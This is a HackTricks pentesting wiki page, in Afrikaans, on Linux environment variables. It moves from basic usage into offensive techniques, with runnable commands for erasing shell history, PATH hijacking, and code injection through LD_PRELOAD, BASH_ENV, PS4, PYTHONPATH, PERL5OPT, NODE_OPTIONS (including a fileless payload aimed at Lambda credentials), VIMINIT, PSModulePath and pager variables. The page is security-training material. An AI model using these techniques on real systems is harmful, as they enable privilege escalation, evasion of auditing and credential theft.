# Linux-omgewingsveranderlikes

{{#include ../../banners/hacktricks-training.md}}

## Globale veranderlikes

Die globale veranderlikes **sal** deur **kinderprosesse** geërf word.

Jy kan ’n globale veranderlike vir jou huidige sessie skep deur:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Hierdie veranderlike sal toeganklik wees vir jou huidige sessies en hul kinderprosesse.

Jy kan ’n veranderlike **verwyder** deur:

```bash
unset MYGLOBAL
```

## Plaaslike veranderlikes

Die **plaaslike veranderlikes** kan slegs deur die **huidige shell/script** **toegang verkry word**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Lys huidige veranderlikes

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Die inhoud van `/proc/*/environ` is **NUL-geskei**, dus is hierdie variante gewoonlik makliker om te lees:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

As jy binne geërfde omgewings na **credentials** of **interessante dienskonfigurasie** soek, kyk ook na [Linux Post Exploitation](../post-exploitation/README.md).

## Algemene veranderlikes

Bron: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – die skerm wat deur **X** gebruik word. Hierdie veranderlike is gewoonlik op **:0.0** gestel, wat die eerste skerm op die huidige rekenaar beteken.
- **EDITOR** – die gebruiker se voorkeurteksredigeerder.
- **HISTFILESIZE** – die maksimum aantal reëls in die geskiedenislêer.
- **HISTSIZE** – die aantal reëls wat by die geskiedenislêer gevoeg word wanneer die gebruiker sy sessie beëindig.
- **HOME** – jou tuisgids.
- **HOSTNAME** – die gasheernaam van die rekenaar.
- **LANG** – jou huidige taal.
- **MAIL** – die ligging van die gebruiker se pos-spoel. Gewoonlik **/var/spool/mail/USER**.
- **MANPATH** – die lys van gidse waarin na manbladsye gesoek moet word.
- **OSTYPE** – die tipe bedryfstelsel.
- **PS1** – die verstekprompt in bash.
- **PATH** – stoor die paaie van al die gidse wat uitvoerbare lêers bevat wat jy wil uitvoer deur net die lêernaam te spesifiseer, en nie ’n relatiewe of absolute pad nie.
- **PWD** – die huidige werkgids.
- **SHELL** – die pad na die huidige opdragdop (byvoorbeeld, **/bin/bash**).
- **TERM** – die huidige terminaaltipe (byvoorbeeld, **xterm**).
- **TZ** – jou tydsone.
- **USER** – jou huidige gebruikersnaam.

## Interessante veranderlikes vir hacking

Nie elke veranderlike is ewe nuttig nie. Vanuit ’n offensiewe perspektief moet jy voorkeur gee aan veranderlikes wat **soekpaaie**, **opstartlêers**, **dinamiese skakelgedrag** of **oudit/registrasie** verander.

### **HISTFILESIZE**

**Verander die waarde van hierdie veranderlike na 0**, sodat die **geskiedenislêer** (\~/.bash_history) tot **0 reëls** afgekap word wanneer jy **jou sessie beëindig**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat opdragte **nie in die geskiedenis in die geheue gehou word nie** en nie na die **geskiedenislêer** (\~/.bash_history) teruggeskryf word nie.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

As die **waarde van hierdie veranderlike op `ignorespace` of `ignoreboth` ingestel is**, sal enige opdrag met ’n ekstra spasie daarvoor nie in die geskiedenis gestoor word nie.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Stel die **geskiedenislêer** op **`/dev/null`** of verwyder die omgewingsveranderlike heeltemal. Dit is gewoonlik meer betroubaar as om net die geskiedenislengte te verander.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Die prosesse sal die **proxy** wat hier gespesifiseer is gebruik om via **http or https** aan die internet te koppel.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: verstekproxy vir nutsmiddels/protokolle wat dit respekteer.
- `no_proxy`: bypasslys (gashere/domeine/CIDR's) wat direk moet koppel.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Beide klein- en hooflettervariante kan gebruik word, afhangend van die tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die prosesse sal die sertifikate vertrou wat in **hierdie omgewingsveranderlikes** aangedui word. Dit is nuttig om tools soos **`curl`**, **`git`**, Python HTTP-kliënte of pakketbestuurders ’n CA te laat vertrou wat deur die aanvaller beheer word (byvoorbeeld om ’n onderskeppingsproxy legitiem te laat lyk).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

As ’n bevoorregte wrapper/script opdragte uitvoer **sonder absolute paths**, kry die **eerste aanvaller-beheerde gids** in `PATH` voorrang. Dit is die primitief agter baie **PATH hijacks** in `sudo`, cron-take, shell-wrappers en pasgemaakte SUID-hulpmiddels. Soek na `env_keep+=PATH`, ’n swak `secure_path`, of wrappers wat `tar`, `service`, `cp`, `python`, ens. op naam aanroep.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Vir volledige voorreg-eskalasiekettings wat `PATH` misbruik, kyk na [Linux-voorreg-eskalasie](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` is nie net ’n gidsverwysing nie: baie nutsprogramme laai outomaties **dotfiles**, **plugins** en **per-gebruiker-konfigurasie** vanaf `$HOME` of `$XDG_CONFIG_HOME`. As ’n bevoorregte werkvloei hierdie waardes behou, kan **config injection** makliker wees as binary hijacking.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interessante teikens sluit `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` en nutsding-spesifieke lêers soos `.terraformrc` in.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Hierdie veranderlikes beïnvloed die **dinamiese linker**:

- `LD_PRELOAD`: dwing ekstra shared objects om eerste gelaai te word.
- `LD_LIBRARY_PATH`: voeg biblioteeksoekgidse vooraan.
- `LD_AUDIT`: laai auditor-biblioteke wat die laai van biblioteke en simboolresolusie waarneem.

Hulle is uiters waardevol vir **hooking**, **instrumentasie** en **privilege escalation** as ’n bevoorregte opdrag hulle behou. In **secure-execution**-modus (`AT_SECURE`, bv. setuid/setgid/capabilities) stroop of beperk die loader baie van hierdie veranderlikes. Parserfoute in daardie vroeë loader-stadium kan egter steeds ’n groot impak hê, omdat dit **voor** die teikenprogram loop.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` verander vroeë glibc-gedrag (byvoorbeeld allocator-tunables) en is baie nuttig in exploit-labs. Dit is ook vanuit ’n sekuriteitsperspektief belangrik, omdat die **dynamic loader dit baie vroeg ontleed**. Die **Looney Tunables**-bug van 2023 was ’n goeie herinnering dat ’n enkele omgewingsveranderlike wat deur die loader ontleed word, ’n **local privilege-escalation primitive** teen SUID-programme kan word.<sup>[[6]](#references)</sup>

Vergelyk vir CVE-2023-4911 die **geïnstalleerde verspreidingspakketweergawe** met die verskaffer se reggestelde weergawe en verifieer watter loader werklik vir nuwe prosesse gebruik word. ’n Upstream-weergawe-string alleen is onbetroubaar: Debian het die betrokke parser na sy 2.31-pakket teruggeporteer, terwyl verspreidings regstellings teruggeporteer het sonder om die upstream-nommer te verander. ’n Praktiese privilege-oorgang vereis ook ’n uitvoerbare bevoorregte teiken waarvan die identiteitsverandering nie deur `NoNewPrivs`, ’n `nosuid`-mount of ’n ander versagting geblokkeer word nie. Moenie ’n foutiewe `GLIBC_TUNABLES`-crash-probe uitvoer tydens passiewe enumerasie nie. Sien die [Ubuntu-spoorsnyer](https://ubuntu.com/security/CVE-2023-4911), [Debian-spoorsnyer](https://security-tracker.debian.org/tracker/CVE-2023-4911) en [Red Hat-advies](https://access.redhat.com/security/cve/cve-2023-4911) vir weergawe-spesifieke toepaslikheid; Ubuntu se [sekuriteitskennisgewing](https://ubuntu.com/security/notices/USN-6409-1) beveel ook ’n herlaai aan nadat opdaterings geïnstalleer is.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

As **Bash** **nie-interaktief** begin word, gaan dit `BASH_ENV` na en laai daardie lêer in voordat die teikenskrip uitgevoer word. Wanneer Bash as `sh` aangeroep word, of in POSIX-styl interaktiewe modus, kan `ENV` ook geraadpleeg word. Dit is ’n klassieke manier om ’n shell-wrapper in kode-uitvoering te omskep as die omgewing deur ’n aanvaller beheer word.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoreer hierdie opstartlêers wanneer die **werklike/effektiewe ID's verskil**; `-p` behou die effektiewe ID, maar aktiveer nie daardie opstartlêers nie, dus hang die presiese gedrag af van hoe die wrapper die shell aanroep. Wees versigtig met bevoorregte wrappers wat `setuid()`/`setgid()` aanroep **voordat** hulle Bash begin: sodra die ID's weer ooreenstem, kan Bash `BASH_ENV`, `ENV` en verwante shell-status vertrou wat andersins geïgnoreer sou word.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Wanneer Bash met **xtrace** geaktiveer loop, brei dit `PS4` uit en druk dit voor elke nagespoorde opdrag. `PS4` word soos 'n prompt uitgebrei, dus word 'n **command substitution** daarin uitgevoer. Belangrik: xtrace kan suiwer vanuit die omgewing aangeskakel word deur `SHELLOPTS=xtrace` uit te voer — `-x` is nie op die opdragreël nodig nie — dus word enige Bash-script wat die slagoffer uitvoer, code execution.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` doen niks totdat xtrace aktief is (`SHELLOPTS=xtrace`, `set -x` of `bash -x`), en Bash laat `SHELLOPTS` weg in bevoorregte/setuid-kontekste, net soos `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Hierdie veranderlikes verander hoe Python begin:

- `PYTHONPATH`: voeg invoersoekpaaie vooraan.
- `PYTHONHOME`: verskuif die standaardbiblioteekboom.
- `PYTHONSTARTUP`: voer ’n lêer uit voordat die interaktiewe prompt verskyn.
- `PYTHONINSPECT=1`: skakel oor na interaktiewe modus nadat ’n skrip voltooi is.
- `PYTHONBREAKPOINT`: `package.module.callable` word opgeroep (en sy module ingevoer) wanneer die kode `breakpoint()` bereik.<sup>[[8]](#references)</sup>

Hulle is nuttig vir onderhoudsskripte, debuggers, shells en wrappers wat Python met ’n beheerbare omgewing aanroep. `python -E` en `python -I` ignoreer alle `PYTHON*`-veranderlikes.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

’n Onlangse werklike voorbeeld was die **needrestart**-LPE van 2024 op Ubuntu-/Debian-stelsels: die root-besitte skandeerder het ’n onbevoorregte proses se `PYTHONPATH` uit `/proc/<PID>/environ` gekopieer en daarna Python uitgevoer. Die gepubliseerde exploit het `importlib/__init__.so` in die aanvaller-beheerde pad geplaas, sodat Python aanvallerkode tydens sy eie inisialisering uitgevoer het, nog voordat die helper se hardgekodeerde script ter sake was.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl het ewe nuttige opstartveranderlikes:

- `PERL5LIB`: plaas biblioteekgidse vooraan.
- `PERL5OPT`: voeg skakelaars in asof hulle op elke `perl`-opdragreël verskyn.

Dit kan **outomatiese modulelaai** afdwing of die interpreter se gedrag verander voordat die teikenscript enigiets interessants doen. Perl ignoreer hierdie veranderlikes in **taint / setuid / setgid**-kontekste, maar hulle is steeds baie belangrik vir gewone root-uitgevoerde wrappers, CI-take, installeerders en pasgemaakte sudoers-reëls.

As ’n sudo-reël omgewingsveranderlikes kan oorskryf en die bevoorregte opdrag uiteindelik Perl begin, moet jy ook `PERL5DB` nagaan. Perl se dokumentasie sê dat `PERL5OPT=-d` die debugger begin, en dat `PERL5DB` debugger-inisialiseringskode verskaf wanneer Perl met ’n blote `-d`-skakelaar begin. Om net `PERL5LIB` en `PERLLIB` te ontstel, verwyder nie hierdie moontlikheid nie. Die veranderlikes moet sudo en die wrapper oorleef, en die Perl-proses moet hulle nie weens taint- of set-ID-hantering ignoreer nie; ondersoek die presiese reël en uitvoeringsketting sonder om die bevoorregte helper tydens die enumerasie uit te voer. Sien [perlrun se verwysing na omgewingsveranderlikes](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Perl se ingeboude [`@INC`-soekpad](https://perldoc.perl.org/perlvar#@INC) is nog ’n modulevertrouensgrens, selfs wanneer geen omgewingsveranderlikes behoue bly nie. Koppel vir ’n bevoorregte Perl-proses ’n werklike `use`- of `require`-stelling aan die opgeloste modulenaam, die soekvolgorde en ’n laerbevoorregte gebruiker se vermoë om daardie module in ’n deursoekte gids te skep of te vervang. ’n Skryfbare biblioteekgids alleen bewys nie dat die bevoorregte proses kode daaruit sal laai nie.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` voeg **Node.js CLI-vlae** vooraan by elke `node`-proses wat die omgewing erf. Dit maak dit nuttig teen wrappers, CI-take, Electron-helpers en sudo-reëls wat uiteindelik Node aanroep. Die interessantste vlae vanuit ’n aanvallende oogpunt is gewoonlik:

- `--require <file>`: laai ’n CommonJS-lêer vooraf voordat die teikenskrip loop.
- `--import <module>`: laai ’n ES-module vooraf voordat die teikenskrip loop.

Node verwerp sommige gevaarlike vlae in `NODE_OPTIONS`, maar `--require` en `--import` word uitdruklik toegelaat en verwerk **voordat** die gewone opdragreëlargumente verwerk word.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Lêerlose preload met ’n `data:`-URL

Wanneer jy `NODE_OPTIONS` kan instel maar **nie ’n lêer** op die teiken kan skryf nie (lêerstelsel wat slegs-lees is, beperkte API, serverlose runtime, ens.), aanvaar `--import` ’n `data:text/javascript,`-URL, sodat die hele payload binne die omgewingsveranderlike self vervoer word. Die JavaScript moet **volledig URL-enkodeer** wees — Node ontleed die waarde as ’n URL, dus verkort enige rou spasie (of ander ongeënkodeerde karakter) die payload en veroorsaak dit ’n `SyntaxError`. Dit werk op Node 20.6+ waar `--import` op die `NODE_OPTIONS`-toegelatingslys is.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Dit is ’n algemene manier om beheer oor `NODE_OPTIONS` in RCE om te skakel op **bestuurde cloud-runtimes** waarvan die funksies Node gebruik. Byvoorbeeld, ’n aanvaller wat slegs ’n Lambda se konfigurasie kan verander (`lambda:UpdateFunctionConfiguration`, geen `iam:PassRole` of kode-opdatering nie), kan `NODE_OPTIONS=--import data:text/javascript,<payload>` inspuit om kode binne die funksie uit te voer en sy uitvoeringsrolbewyse te steel. Die ingespuite module loop **voor** die hanteerder, wat daarna steeds normaal uitgevoer word.

Vir afgeleë gadget-kettings wat `NODE_OPTIONS` indirek stel (byvoorbeeld, prototype pollution na RCE), kyk na [hierdie ander bladsy](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bied dieselfde soort opstartmisbruik:

- `RUBYLIB`: voeg gidse vooraan Ruby se laaipad.
- `RUBYOPT`: spuit opdragreëlopsies soos `-r` by elke `ruby`-aanroep in.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Die **needrestart**-kwesbaarhede van 2024 het gewys dat dit nie net ’n laboratoriumtruuk is nie: dieselfde root-besitte helper wat kwesbaar was vir `PYTHONPATH`-misbruik, kon ook gedwing word om Ruby met ’n aanvaller-beheerde `RUBYLIB` uit te voer en `enc/encdb.so` vanuit ’n aanvallergids te laai.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim voer tydens ’n normale opstart die Ex-opdragte uit wat in `VIMINIT` (of die terugvalopsie `EXINIT`) vervat is. Ex-opdragte sluit `:!cmd` en `:call system(...)` in, so beheer oor die veranderlike lei tot kode-uitvoering wanneer ’n slagoffer Vim oopmaak (`sudo vim` as root, `crontab -e`, `visudo`, `git`/`less` wat `$EDITOR` laat loop, ens.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) slaan hierdie veranderlikes oor, maar ’n normale interaktiewe opstart voer hulle uit.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) loop op Linux/macOS (en Windows) en is ’n **.NET-toepassing**, dus kan verskeie omgewingsveranderlikes enige `pwsh`-aanroep met ’n geërfde omgewing in code execution omskep — nuttig teen cron/systemd-take, CI-runners en bevoorregte omhulsels wat `pwsh` as ’n subproses aanroep.

- `PSModulePath`: PowerShell deursoek elke gids in hierdie lys rekursief vir `.psd1`/`.psm1`-modules en **laai outomaties** een wanneer ’n opdrag wat dit uitvoer, vir die eerste keer gebruik word. Voeg ’n gids vooraan by en jou module se topvlak-kode loop tydens invoer; omdat naamoplossing *Alias → Function → Cmdlet* is, kan ’n uitgevoerde funksie selfs ’n ingeboude cmdlet wat die slagoffer aanroep, oorskadu.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: verskuif `powershell/Microsoft.PowerShell_profile.ps1`, wat tydens opstart uitgevoer word (tensy `-NoProfile` gebruik word).
- `DOTNET_STARTUP_HOOKS`: ’n bestuurde assembly waarvan `StartupHook.Initialize()` loop voordat `Main` begin (gedeel deur elke .NET-toepassing).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: die CLR-profilering-API laai ’n aanvaller se biblioteek tydens opstart in die proses (padveranderlikes geniet voorkeur bo die register; `DOTNET_*` is die nuwer alias). Gebruik `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` op Windows PowerShell 5.1 (.NET Framework). MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Op Windows verwyder `PSExecutionPolicyPreference=Bypass` ook die beskerming wat "unsigned scripts blocked" voorkom, sodat ’n geplante profiel/module werklik loop. Sien die toegewyde bladsy vir volledige PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Sommige nutsprogramme lees nie net ’n pad uit die omgewing nie; hulle gee die waarde aan ’n **shell**, ’n **editor** of ’n **invoervoorverwerker**. Dit maak die volgende veranderlikes besonder interessant wanneer ’n bevoorregte wrapper `git`, `man`, `less` of soortgelyke tekskykers uitvoer:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: kies die pager-opdrag.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: kies die editor-opdrag, dikwels met argumente.
- `LESSOPEN`, `LESSCLOSE`: definieer voor-/naverwerkers wat loop wanneer `less` ’n lêer oopmaak.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git ondersteun ook **konfigurasie-inspuiting wat slegs omgewingsveranderlikes gebruik**, sonder om die skyf aan te raak, via `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` en `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Vanuit ’n post-exploitation-perspektief, onthou ook dat geërfde omgewings dikwels **credentials**, **proxy-instellings**, **diensbewyse** of **cloud-sleutels** bevat. Kyk na [Linux Post Exploitation](../post-exploitation/README.md) vir die opsporing van `/proc/<PID>/environ` en `systemd` `Environment=`.

### PS1

Verander hoe jou prompt lyk.

[**Dit is ’n voorbeeld**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dit is ’n voorbeeld](<../images/image (897).png>)

Gewone gebruiker:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie agtergrondtake](<../images/image (740).png>)

Een, twee en drie agtergrondtake:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie agtergrondtake](<../images/image (145).png>)

Een agtergrondtaak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie:

![PERL5OPT & PERL5LIB - PS1: Een agtergrondtaak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie](<../images/image (715).png>)

## References

- [1] [GNU Bash-handleiding - Bash-opstartlêers](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI-dokumentasie - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Algemene omgewingsveranderlikes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Plaaslike regte-uitbreiding in glibc se ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash-handleiding - Bash-veranderlikes (`PS4`) en die ingeboude Set-opdrag (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Ingeboude breakpoint() en PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim-dokumentasie - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath en outomatiese laai van PowerShell-modules](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET-ontfoutings- en profileringskonfigurasie-instellings (`CORECLR_`/`DOTNET_`/`COR_`-profielervariables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
